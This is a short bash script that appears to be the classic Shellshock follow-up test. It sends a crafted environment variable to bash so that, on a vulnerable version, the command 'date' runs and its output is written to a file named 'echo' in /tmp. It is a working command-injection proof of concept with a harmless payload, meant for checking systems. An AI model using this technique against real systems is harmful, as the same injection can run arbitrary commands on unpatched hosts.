#!/bin/bash
cd /tmp; rm -f echo; env 'x=() { (a)=>\' bash -c "echo date"; cat echo
